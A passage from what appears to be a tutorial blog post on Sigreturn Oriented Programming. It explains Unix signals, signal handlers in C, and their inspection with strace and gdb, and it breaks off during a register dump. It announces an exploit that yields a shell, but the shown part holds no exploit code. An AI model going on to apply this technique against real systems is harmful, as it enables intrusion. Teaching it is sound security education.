---                                                                             
title: Sigreturn Oriented Programming - An Introduction
layout: post
categories: Reverse Engineering and Binary Exploitation Series
comments: true
---

Hello friend!

In this post, we will be looking at a crazy binary exploitation method called the **Sigreturn Oriented Programming(SROP)**. It exploits a vulnerability present in the way **signals** are handled in *NIX operating systems. Links to the paper: [official_link](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf), [backup_link](https://github.com/adwait1-G/TheBEBook/blob/main/exploit-methods/Sigreturn-Oriented-Programming-2014.pdf).

The following is what we will do.
1. Understand what a signal is, with an example.
2. Get into its internals - How signal works under the hood.
3. Identifying the vulnerability.
4. Then see how it can be exploited and get a shell!

I am assuming that you know the basics of Return Oriented Programming(ROP). Although ROP and SROP exploit different vulnerabilities, understanding ROP opens up the mind to such wierd, unconventional exploit methods and will make it easy to understand SROP better.

Lets get started!

## 1. What is a signal?

A Signal is a software-interrupt sent to your program when certain event happens. Consider the following program.

```c
srop$ cat code1.c
#include <stdio.h>

int main()
{ 
  printf("Entering infinite loop.\n");
	while(1);
	return 0;
}
```

It is a simple program which simply loops infinitely. Compile and run it.

```
srop$ ./a.out
Entering infinite loop.

```

Probably the most common "signal" we send to such simple applications is **Ctrl+C** - when we want to kill/terminate it. Go ahead and kill it.

But how does it happen? When you press a set of keyboard keys together, how is the intent of killing the application delivered to the application? It is via **signals**. Let us run our program along with *strace* and then try to kill it.

```
srop$ strace ./a.out
execve("./a.out", ["./a.out"], 0x7ffd04832d10 /* 75 vars */) = 0
brk(NULL)                               = 0x562767401000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "tls/haswell/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "tls/haswell/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "tls/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "tls/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "haswell/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "haswell/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "./tls/haswell/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "./tls/haswell/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "./tls/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "./tls/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "./haswell/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "./haswell/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "./x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "./libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/tls/haswell/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
stat("/tls/haswell/x86_64", 0x7ffe421f36a0) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/tls/haswell/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
stat("/tls/haswell", 0x7ffe421f36a0)    = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/tls/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
stat("/tls/x86_64", 0x7ffe421f36a0)     = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/tls/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
stat("/tls", 0x7ffe421f36a0)            = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/haswell/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
stat("/haswell/x86_64", 0x7ffe421f36a0) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/haswell/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
stat("/haswell", 0x7ffe421f36a0)        = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
stat("/x86_64", 0x7ffe421f36a0)         = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
stat("", 0x7ffe421f36a0)                = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=191203, ...}) = 0
mmap(NULL, 191203, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f792a6b3000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\20\35\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=2030928, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f792a6b1000
mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f792a0c8000
mprotect(0x7f792a2af000, 2097152, PROT_NONE) = 0
mmap(0x7f792a4af000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f792a4af000
mmap(0x7f792a4b5000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f792a4b5000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7f792a6b24c0) = 0
mprotect(0x7f792a4af000, 16384, PROT_READ) = 0
mprotect(0x562765e61000, 4096, PROT_READ) = 0
mprotect(0x7f792a6e2000, 4096, PROT_READ) = 0
munmap(0x7f792a6b3000, 191203)          = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
brk(NULL)                               = 0x562767401000
brk(0x562767422000)                     = 0x562767422000
write(1, "Entering infinite loop.\n", 24Entering infinite loop.
) = 24


```

Once the ```write()``` is executed, it simply loops. Now, let us press Ctrl+C.

```
write(1, "Entering infinite loop.\n", 24Entering infinite loop.
) = 24
^C--- SIGINT {si_signo=SIGINT, si_code=SI_KERNEL} ---
strace: Process 4268 detached
```

So a signal called **SIGINT** is sent to our process when Ctrl+C is pressed. That is killing the application.

This is one signal we us commonly. There are lot more such signals. Let us go over **signal**'s manpage to know more.

```
SIGNAL(7)                                                             Linux Programmer's Manual                                                            SIGNAL(7)

NAME
       signal - overview of signals

DESCRIPTION
       Linux supports both POSIX reliable signals (hereinafter "standard signals") and POSIX real-time signals.

   Signal dispositions
       Each signal has a current disposition, which determines how the process behaves when it is delivered the signal.

       The entries in the "Action" column of the tables below specify the default disposition for each signal, as follows:

       Term   Default action is to terminate the process.

       Ign    Default action is to ignore the signal.

       Core   Default action is to terminate the process and dump core (see core(5)).

       Stop   Default action is to stop the process.

       Cont   Default action is to continue the process if it is currently stopped.
```

Let us go over to the list of signals.

```
       Signal     Value     Action   Comment
       ──────────────────────────────────────────────────────────────────────
       SIGHUP        1       Term    Hangup detected on controlling terminal
                                     or death of controlling process
       SIGINT        2       Term    Interrupt from keyboard
       SIGQUIT       3       Core    Quit from keyboard
       SIGILL        4       Core    Illegal Instruction
       SIGABRT       6       Core    Abort signal from abort(3)
       SIGFPE        8       Core    Floating-point exception
       SIGKILL       9       Term    Kill signal
       SIGSEGV      11       Core    Invalid memory reference
       SIGPIPE      13       Term    Broken pipe: write to pipe with no
                                     readers; see pipe(7)
       SIGALRM      14       Term    Timer signal from alarm(2)
       SIGTERM      15       Term    Termination signal
       SIGUSR1   30,10,16    Term    User-defined signal 1
       SIGUSR2   31,12,17    Term    User-defined signal 2
       SIGCHLD   20,17,18    Ign     Child stopped or terminated
       SIGCONT   19,18,25    Cont    Continue if stopped
       SIGSTOP   17,19,23    Stop    Stop process
       SIGTSTP   18,20,24    Stop    Stop typed at terminal
       SIGTTIN   21,21,26    Stop    Terminal input for background process
       SIGTTOU   22,22,27    Stop    Terminal output for background process
```

What we saw in the above example is **SIGINT** which is Interrupt from keyboard. Let us checkout **SIGQUIT** - it is supposed to terminate the program and dump the core. The keyboard shortcut for SIGQUIT is **Ctrl+\**.

```
srop$ ./a.out
Entering infinite loop.

^\Quit (core dumped)
```

Then comes a few signals which kill the program and dump the core. **SIGILL** is sent to the program if an Illegal Instruction - an instruction not present in the Instruction Set Architecture is executed. **SIGABRT**, **SIGSEGV** - these two are very common signals when you are playing around with Buffer Overflows.

Two interesting signals are **SIGCONT** and **SIGSTOP**. These two signals can be used to control the execution of a process. If you send the process the **SIGSTOP** signal, it will stop running. Later, if you send **SIGCONT**, it will resume from where it stopped. Debuggers use these two signals extensively to implement instructions like **run**, **continue**, **next**, **step** etc., When you want to go instruction by instruction, then you should "continue" for one instruction and then stop right after that. The debugger sends the signals to the process and controls the execution.

To experiment with these signals and see how they behave, let us use the **kill** command. The command name is kill, but it can be used to send any signal which doesn't necessary kill the process as well. Run the process in one terminal and on another - run the kill command. 

```
srop$ ./a.out
Entering infinite loop.

```

Let us start with **SIGSTOP**. You will have to get the process-ID of a.out.

```
$ kill -n SIGSTOP 5399
```

You should see the following in the a.out terminal.

```
srop$ ./a.out
Entering infinite loop.


[1]+  Stopped                 ./a.out
```

It says, it stopped. Now, let us send a **SIGCONT** to it and let it resume.

```
$ kill -n SIGCONT 5399
```

The execution would have resumed but it is not seen in the terminal. It will be running as a background process. This can be confirmed by running the **ps** command a couple of times.

```
srop$ ps
  PID TTY          TIME CMD
 5399 pts/0    00:03:45 a.out
 5567 pts/0    00:00:00 ps
15710 pts/0    00:00:00 bash
srop$ ps
  PID TTY          TIME CMD
 5399 pts/0    00:04:59 a.out
 5619 pts/0    00:00:00 ps
15710 pts/0    00:00:00 bash
```

The TIME is progressing.

Note that different entities can send a signal to a process. Another process can send it, the kernel can send it. SIGILL(Illegal Instruction), SIGFPE(Floating-Point Exception), SIGSEGV(Invalid memory Dereference) are generally sent by the kernel, but we can also send it using the **kill** command.

# 1.1 Catching these signals

Open up the python interpreter on a terminal.

```
srop$ python3
Python 3.6.9 (default, Jan 26 2021, 15:33:00) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
>>> 
```

Send **SIGINT** to it by pressing **Ctrl+C**.

```
srop$ python3
Python 3.6.9 (default, Jan 26 2021, 15:33:00) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
>>> 
KeyboardInterrupt
>>> 
KeyboardInterrupt
>>> 
KeyboardInterrupt
>>> 
```

How did that happen? Ideally, the interpreter should be terminated when we sent a SIGINT to it, instead it printed a string and the interpreter was still alive.

How does a process react on receiving a signal? There is a specific default behavior defined for each signal and the process behaves accordingly. But we can alter its behavior using the **signal** C API. The process can "catch" the signal and it can decide what to do. It can kill itself, it can ignore the signal, it can print something etc., Please go through **signal**'s manpage.

For a particular signal, we can register a "signal handler" - which is a normal function. Whenever the process receives that signal, the corresponding signal handler function is executed. Let us take an example.

Let us take a very simple signal handler function - for SIGINT.

```c
void sigint_handler(int x)
{
	printf("sigint_handler says Hi!\n");
}
```

Default behavior of a process when a SIGINT is sent to it is to get terminated. But now, we don't want that to happen. We want the ```signal_handler()``` function to get executed whenever we send a SIGINT to it.

Let us now write the ```main()``` function.

```c
int main()
{
	/* Register the handler */
	signal(SIGINT, sigint_handler);
	printf("Entering infinite loop.\n");
	while(1);
}
```

We are using the ```signal()``` function to register the signal handler. Note that you need to include **signal.h**.

Let us compile the program and run it.

```
srop$ gcc code2.c -o code2 -g
srop$ ./code2
Entering infinite loop.

```

Now, go ahead and press **Ctrl+C** and see what happens.

```
~/Documents/pwnthebox/exp/srop$ ./code2
Entering infinite loop.

^Csigint_handler says Hi!
^Csigint_handler says Hi!
^Csigint_handler says Hi!
```

You should see that the process is not terminated.

This way, any signal(except SIGKILL and SIGSTOP) can be caught and a corresponding handler could be executed. I urge you to catch SIGSEGV, SIGFPE, SIGABRT, SIGILL and attach a simple handler for them - that way your program will not die even if it does something wrong (like execute an illegal instruction, divide something by 0, dereference an invalid address). The program will still be alive.

## 2. How does signal handling work?

In the above example, the process was in a simple infinite loop. It is in the **user-context** and it keeps running one single assembly instruction - which ```jmp```s to itself. And then we press **Ctrl+C**. Out of nowhere, the ```sigint_handler()``` function is executed. Once it is done, the process goes back to the infinite loop.

How did control go from infinite loop to the signal handler? The normal control-flow was "interrupted" and the signal handler was executed. Once it is done, the process goes back to executing according to the normal control-flow.

Generally, when we talk about context switches, we talk about going from user-context to kernel context when we request the kernel to run a system call TO going back to user-context once the kernel is done executing. Here, the details related to the context-change are completely abstracted from userspace. All we need to do is to run the ```syscall``` instruction(in x86_64) and kernel will take care of the rest.

In our case here, both the contexts are user-contexts. One is the normal program code - which is simply an infinite loop in our case. Other is the signal-handler which is also user-space code and runs in user-context as a result of a signal sent to the process. Qn: How exactly does this context change take place? What does catching a signal mean? How is the program code stopped and signal handler invoked? And how is it reverted back? These are the questions we will explore in this section.

# 2.1 Process-context and Signal-context

Whenever a process undergoes a context switch from user-context to kernel context, the **Process Control Block(PCB)** for the process is stored before the kernel code is actually executed. The PCB has the "user-context" of the process - values of general purpose registers, segment registers, floating-point registers, vector registers and more. It is like a snapshot of the processor when the process is running in user-context just before kernel took over - this is stored and the kernel code starts running. Once the kernel code is done, the snapshot is loaded onto the processor(with necessary changes) and the process starts running userspace code(aka user-context).

The snapshot is at the core of this context switch.

It is fair to guess that a similar thing should be happening with signal handling too. Let us call the two contexts process-context and signal-context. The process is running in process-context when normal code is executed. The process is running in signal-context when the signal handler is executed. Note that both are user-contexts, but for the sake of clarity, we have divided them.

Let us take the above example **code2.c**.

```c
srop$ cat code2.c
#include <stdio.h>
#include <signal.h>

void sigint_handler(int x)
{
	printf("sigint_handler says Hi!\n");
}

int main()
{
	/* Register the handler */
	signal(SIGINT, sigint_handler);
	printf("Entering infinite loop.\n");
	while(1);
}
srop$ gcc code2.c -o code2 -g
```

Let us run this program with gdb. Break at ```main``` and ```sigint_handler```. Please note that I am using a gdb plugin called [peda](https://github.com/longld/peda).

```
srop$ gdb -q code2
Reading symbols from code2...done.
gdb-peda$ b main
Breakpoint 1 at 0x6a8: file code2.c, line 12.
gdb-peda$ b sigint_handler 
Breakpoint 2 at 0x695: file code2.c, line 6.
gdb-peda$
```

Let us run. When I press Ctrl+C, I expect to hit the Breakpoint 2 at sigint_handler.

```
gdb-peda$ c
Continuing.
Entering infinite loop.
.
.
Stopped reason: SIGINT
main () at code2.c:14
14		while(1);
```

The debugger caught the interrupt and stopped the program. But this is not what we expected. We expected to stop at sigint_handler. Let us see what gdb has to say about this.

```
gdb-peda$ info signals
Signal        Stop	Print	Pass to program	Description

SIGHUP        Yes	  Yes	  Yes		Hangup
SIGINT        Yes	  Yes	  No		Interrupt
SIGQUIT       Yes 	Yes	  Yes		Quit
SIGILL        Yes 	Yes	  Yes		Illegal instruction
SIGTRAP       Yes 	Yes	  No		Trace/breakpoint trap
SIGABRT       Yes 	Yes	  Yes		Aborted
SIGEMT        Yes 	Yes	  Yes		Emulation trap
SIGFPE        Yes 	Yes	  Yes		Arithmetic exception
.
.
```

The second signal is **SIGINT**. The current configuration is that the debugger stops on a SIGINT, it prints info on getting a SIGINT BUT it doesn't pass the SIGINT to our program. Note that there is a **No** under **Pass to Program**. That is the problem. Let us go ahead and change it.

```
gdb-peda$ handle SIGINT pass
Signal        Stop	Print	Pass to program	Description
SIGINT        Yes	  Yes	  Yes		Interrupt
```

Now, we are set.

Before moving forward, let us get a snapshot of the normal process-context - because we expect it to change.

```
[----------------------------------registers-----------------------------------]
RAX: 0x18 
RBX: 0x0 
RCX: 0x7ffff7af2224 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dcf8c0 --> 0x0 
RSI: 0x555555756260 ("Entering infinite loop.\n")
RDI: 0x1 
RBP: 0x7fffffffd860 --> 0x5555555546d0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffd860 --> 0x5555555546d0 (<__libc_csu_init>:	push   r15)
RIP: 0x5555555546c5 (<main+33>:	jmp    0x5555555546c5 <main+33>)
R8 : 0x0 
R9 : 0x0 
R10: 0x555555756010 --> 0x0 
R11: 0x246 
R12: 0x555555554580 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffd940 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555546b4 <main+16>:	call   0x555555554560 <signal@plt>
   0x5555555546b9 <main+21>:	lea    rdi,[rip+0xac]        # 0x55555555476c
   0x5555555546c0 <main+28>:	call   0x555555554550 <puts@plt>
=> 0x5555555546c5 <main+33>:	jmp    0x5555555546c5 <main+33>
 | 0x5555555546c7:	nop    WORD PTR [rax+rax*1+0x0]
 | 0x5555555546d0 <__libc_csu_init>:	push   r15
 | 0x5555555546d2 <__libc_csu_init+2>:	push   r14
 | 0x5555555546d4 <__libc_csu_init+4>:	mov    r15,rdx
 |->=> 0x5555555546c5 <main+33>:	jmp    0x5555555546c5 <main+33>
       0x5555555546c7:	nop    WORD PTR [rax+rax*1+0x0]
       0x5555555546d0 <__libc_csu_init>:	push   r15
       0x5555555546d2 <__libc_csu_init+2>:	push   r14
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd860 --> 0x5555555546d0 (<__libc_csu_init>:	push   r15)
0008| 0x7fffffffd868 --> 0x7ffff7a03bf7 (<__libc_start_main+231>:	mov    edi,eax)
0016| 0x7fffffffd870 --> 0x1 
0024| 0x7fffffffd878 --> 0x7fffffffd948 --> 0x7fffffffdd2c ("/home/dell/Documents/pwnthebox/exp/srop/code2")
0032| 0x7fffffffd880 --> 0x100008000 
0040| 0x7fffffffd888 --> 0x5555555546a4 (<main>:	push   rbp)
0048| 0x7fffffffd890 --> 0x0 
0056| 0x7fffffffd898 --> 0x89be6a255307003 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```

Let us get all the registers.

```
gdb-peda$ i r all
rax            0x18	0x18
rbx            0x0	0x0
rcx            0x7ffff7af2224	0x7ffff7af2224
rdx            0x7ffff7dcf8c0	0x7ffff7dcf8c0
rsi            0x555555756260	0x555555756260
rdi            0x1	0x1
rbp            0x7fffffffd860	0x7fffffffd860
rsp            0x7fffffffd860	0x7fffffffd860
r8             0x0	0x0
r9             0x0	0x0
r10            0x555555756010	0x555555756010
r11            0x246	0x246
r12            0x555555554580	0x555555554580
r13            0x7fffffffd940	0x7fffffffd940
r14            0x0	0x0
r15            0x0	0x0
rip            0x5555555546c5	0x5555555546c5 <main+33>
eflags         0x202	[ IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
st0            0	(raw 0x00000000000000000000)
st1            0	(raw 0x00000000000000000000)
st2            0	(raw 0x00000000000000000000)
st3            0	(raw 0x00000000000000000000)
st4            0	(raw 0x00000000000000000000)
st5            0	(raw 0x00000000000000000000)
st6            0	(raw 0x00000000000000000000)
st7            0	(raw 0x00000000000000000000)
fctrl          0x37f	0x37f
fstat          0x0	0x0
ftag           0xffff	0xffff
fiseg          0x0	0x0
fioff          0x0	0x0
foseg          0x0	0x0
fooff          0x0	0x0
fop            0x0	0x0
mxcsr          0x1f80	[ IM DM ZM OM UM PM ]
ymm0           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x80, 0xe4, 0xdc, 0xf7, 0xff, 0x7f, 0x0, 0x0, 0x80, 0xe4, 0xdc, 0xf7, 0xff, 0x7f, 0x0 <repeats 18 times>}, 
  v16_int16 = {0xe480, 0xf7dc, 0x7fff, 0x0, 0xe480, 0xf7dc, 0x7fff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v8_int32 = {0xf7dce480, 0x7fff, 0xf7dce480, 0x7fff, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x7ffff7dce480, 0x7ffff7dce480, 0x0, 0x0}, 
  v2_int128 = {0x7ffff7dce48000007ffff7dce480, 0x0}
}
ymm1           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x40, 0xe4, 0xdc, 0xf7, 0xff, 0x7f, 0x0, 0x0, 0x40, 0xe4, 0xdc, 0xf7, 0xff, 0x7f, 0x0 <repeats 18 times>}, 
  v16_int16 = {0xe440, 0xf7dc, 0x7fff, 0x0, 0xe440, 0xf7dc, 0x7fff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v8_int32 = {0xf7dce440, 0x7fff, 0xf7dce440, 0x7fff, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x7ffff7dce440, 0x7ffff7dce440, 0x0, 0x0}, 
  v2_int128 = {0x7ffff7dce44000007ffff7dce440, 0x0}
}
ymm2           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x7d, 0x0, 0x0, 0x0, 0x7e, 0x0, 0x0, 0x0, 0x7f, 0x0, 0x0, 0x0, 0x80, 0x0 <repeats 19 times>}, 
  v16_int16 = {0x7d, 0x0, 0x7e, 0x0, 0x7f, 0x0, 0x80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v8_int32 = {0x7d, 0x7e, 0x7f, 0x80, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x7e0000007d, 0x800000007f, 0x0, 0x0}, 
  v2_int128 = {0x800000007f0000007e0000007d, 0x0}
}
ymm3           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x30, 0xdc, 0xdc, 0xf7, 0xff, 0x7f, 0x0, 0x0, 0x30, 0xdc, 0xdc, 0xf7, 0xff, 0x7f, 0x0 <repeats 18 times>}, 
  v16_int16 = {0xdc30, 0xf7dc, 0x7fff, 0x0, 0xdc30, 0xf7dc, 0x7fff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v8_int32 = {0xf7dcdc30, 0x7fff, 0xf7dcdc30, 0x7fff, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x7ffff7dcdc30, 0x7ffff7dcdc30, 0x0, 0x0}, 
  v2_int128 = {0x7ffff7dcdc3000007ffff7dcdc30, 0x0}
}
ymm4           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0xe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe, 0x0 <repeats 23 times>}, 
  v16_int16 = {0xe, 0x0, 0x0, 0x0, 0xe, 0x0 <repeats 11 times>}, 
  v8_int32 = {0xe, 0x0, 0xe, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0xe, 0xe, 0x0, 0x0}, 
  v2_int128 = {0xe000000000000000e, 0x0}
}
ymm5           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, 
  v16_int16 = {0x0 <repeats 16 times>}, 
  v8_int32 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x0, 0x0, 0x0, 0x0}, 
  v2_int128 = {0x0, 0x0}
}
ymm6           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x8000000000000000, 0x8000000000000000, 0x0, 0x0}, 
  v32_int8 = {0xff <repeats 16 times>, 0x0 <repeats 16 times>}, 
  v16_int16 = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v8_int32 = {0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0xffffffffffffffff, 0xffffffffffffffff, 0x0, 0x0}, 
  v2_int128 = {0xffffffffffffffffffffffffffffffff, 0x0}
}
ymm7           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x4, 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0x4, 0x0 <repeats 19 times>}, 
  v16_int16 = {0x4, 0x0, 0x4, 0x0, 0x4, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v8_int32 = {0x4, 0x4, 0x4, 0x4, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x400000004, 0x400000004, 0x0, 0x0}, 
  v2_int128 = {0x4000000040000000400000004, 0x0}
}
ymm8           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x20, 0xe4, 0xdc, 0xf7, 0xff, 0x7f, 0x0, 0x0, 0x20, 0xe4, 0xdc, 0xf7, 0xff, 0x7f, 0x0 <repeats 18 times>}, 
  v16_int16 = {0xe420, 0xf7dc, 0x7fff, 0x0, 0xe420, 0xf7dc, 0x7fff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v8_int32 = {0xf7dce420, 0x7fff, 0xf7dce420, 0x7fff, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x7ffff7dce420, 0x7ffff7dce420, 0x0, 0x0}, 
  v2_int128 = {0x7ffff7dce42000007ffff7dce420, 0x0}
}
ymm9           {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, 
  v16_int16 = {0x0 <repeats 16 times>}, 
  v8_int32 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x0, 0x0, 0x0, 0x0}, 
  v2_int128 = {0x0, 0x0}
}
ymm10          {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, 
  v16_int16 = {0x0 <repeats 16 times>}, 
  v8_int32 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x0, 0x0, 0x0, 0x0}, 
  v2_int128 = {0x0, 0x0}
}
ymm11          {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, 
  v16_int16 = {0x0 <repeats 16 times>}, 
  v8_int32 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x0, 0x0, 0x0, 0x0}, 
  v2_int128 = {0x0, 0x0}
}
ymm12          {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, 
  v16_int16 = {0x0 <repeats 16 times>}, 
  v8_int32 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x0, 0x0, 0x0, 0x0}, 
  v2_int128 = {0x0, 0x0}
}
ymm13          {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
